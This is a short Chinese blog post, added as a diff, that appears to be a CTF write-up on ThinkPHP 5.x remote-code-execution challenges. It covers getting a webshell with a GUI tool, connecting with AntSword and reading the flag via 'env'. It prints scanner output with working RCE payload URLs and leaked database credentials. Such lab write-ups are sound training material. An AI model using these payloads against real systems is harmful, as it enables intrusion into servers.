@@ -1,0 +1,52 @@
+---
+layout: post
+title:  RCE漏洞利用
+date:   2022-05-31 00:08:01 +0300
+image:  2022-05-31-wedding.jpg
+tags:   [web,php,RCE]
+---
+
+## [ThinkPHP]5-Rce
+
+使用Thinkphp GUI工具
+
+![]({{site.baseurl}}/img/rce/2022-05-31-5-rce.jpg)
+
+点击GetShell
+
+![]({{site.baseurl}}/img/rce/2022-05-31-5-rce-getshell.jpg)
+
+使用蚁剑连接
+
+## [ThinkPHP]5.0.23-Rce
+
+蚁剑连接后
+
+```assembly
+env
+```
+
+在环境变量中找到flag
+
+## [ThinkPHP]IN SQL INJECTION
+
+使用工具打发现有3个洞
+
+```assembly
+检测所有漏洞中......
+[-] 不存在ThinkPHP 5.0 RCE
+[+] 存在ThinkPHP 5.0.10 construct RCE
+Payload: http://node4.buuoj.cn:27799/?s=index Post: _method=__construct&method=get&filter[]=phpinfo&get[]=-1
+[+] 存在ThinkPHP 5.0.22/5.1.29 RCE
+Payload: http://node4.buuoj.cn:27799/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+[+] 存在ThinkPHP 5.0.23 RCE
+Payload: http://node4.buuoj.cn:27799/?s=captcha&test=-1 Post: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
+[-] 不存在ThinkPHP 5.0.24-5.1.30 RCE
+[-] 不存在ThinkPHP 3.x RCE
+[+] 存在ThinkPHP 5.x 数据库信息泄露
+Payload: username:root hostname:mysql password:root database:cat
+[-] 不存在ThinkPHP 3.x Log RCE
+[-] 不存在ThinkPHP 5.x 日志泄露
+[-] 不存在ThinkPHP 3.x 日志泄露
+```
+
